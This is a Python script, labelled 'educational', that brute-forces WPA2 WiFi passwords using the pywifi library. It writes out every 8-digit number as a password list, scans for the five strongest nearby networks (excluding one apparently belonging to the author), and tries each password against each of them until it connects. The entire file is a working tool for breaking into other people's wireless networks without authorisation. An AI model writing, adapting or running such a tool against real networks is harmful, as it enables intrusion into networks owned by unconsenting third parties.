"""WiFi brute-force cracking tool (for educational purposes only).

Dependencies: pywifi
Environment: Windows 10, Python 3.6+, PyCharm

Workflow:
1. Generate password dictionary (8-digit numbers in example)
2. Scan available WiFi networks
3. Attempt connection with each password from dictionary
"""

import itertools as its
import time
from collections.abc import Iterator
from typing import Any

from pywifi import PyWiFi, const


def generate_password_dict() -> None:
    """Generate 8-digit numeric password dictionary and save to file."""
    digits: str = "1234567890"
    # Generate all 8-digit combinations (00000000 to 99999999)
    combinations: Iterator[tuple[str, ...]] = its.product(digits, repeat=8)

    with open("password-8 digits.txt", "w", encoding="utf-8") as f:
        for combo in combinations:
            password: str = "".join(combo)
            f.write(f"{password}\n")


def get_wifi(wifi_exclude: list[str], wifi_count: int) -> list[str]:
    """
    Scan nearby WiFi networks, return top N SSIDs (excluding specified ones).

    Args:
        wifi_exclude: List of WiFi names to skip
        wifi_count: Max number of WiFi networks to return

    Returns:
        List of target WiFi SSIDs
    """
    wifi: PyWiFi = PyWiFi()
    iface = wifi.interfaces()[0]  # Get first network interface (no explicit type)
    iface.scan()
    time.sleep(8)  # Wait for scan results

    # Get unique SSIDs with signal strength
    scan_results: list[Any] = iface.scan_results()
    unique_wifis: list[tuple[str, int]] = []
    seen_ssids: list[str] = []

    for result in scan_results:
        ssid: str = result.ssid
        if ssid not in seen_ssids:
            seen_ssids.append(ssid)
            unique_wifis.append((ssid, result.signal))

    # Sort by signal strength (descending)
    unique_wifis.sort(key=lambda x: x[1], reverse=True)

    # Filter excluded and limit count
    target_ssids: list[str] = []
    for ssid, _ in unique_wifis:
        if ssid not in wifi_exclude and ssid not in target_ssids:
            target_ssids.append(ssid)
            if len(target_ssids) >= wifi_count:
                break

    return target_ssids


def get_interface() -> Any:
    """Initialize and return network interface (disconnect first)."""
    wifi: PyWiFi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()  # Ensure clean state
    return iface


def test_wifi(iface: Any, ssid: str, password: str) -> bool:
    """
    Test if given password connects to target WiFi.

    Args:
        iface: Network interface to use
        ssid: Target WiFi name
        password: Password to test

    Returns:
        True if connection succeeds, False otherwise
    """
    # Create connection profile
    profile = iface.add_network_profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    # Clean up and connect
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    iface.connect(tmp_profile)

    # Wait for connection attempt (5 seconds)
    time.sleep(5)
    return iface.status() == const.IFACE_CONNECTED


def start_cracking(wifi_names: list[str]) -> None:
    """
    Brute-force crack target WiFi networks using password dictionary.

    Args:
        wifi_names: List of WiFi SSIDs to target
    """
    iface: Any = get_interface()
    password_file: str = "password-8 digits.txt"  # Path to password dict

    with open(password_file, encoding="utf-8") as f:
        while True:
            password: str = f.readline()
            if not password:  # End of file
                break

            password = password.strip()
            for wifi in wifi_names.copy():  # Use copy to modify list during loop
                print(f"Trying: {wifi} with password: {password}")
                if test_wifi(iface, wifi, password):
                    print(f"Success! WiFi: {wifi}, Password: {password}")
                    wifi_names.remove(wifi)
                    if not wifi_names:  # All cracked
                        return


if __name__ == "__main__":
    # Generate password dictionary first
    generate_password_dict()

    # Configuration
    exclude_wifi: list[str] = ["", "Vrapile"]  # WiFi names to skip
    max_targets: int = 5  # Max number of WiFi networks to target

    # Get target WiFi list
    target_wifis: list[str] = get_wifi(exclude_wifi, max_targets)
    print(f"Target WiFi networks: {target_wifis}")

    # Start brute-force
    start_cracking(target_wifis)
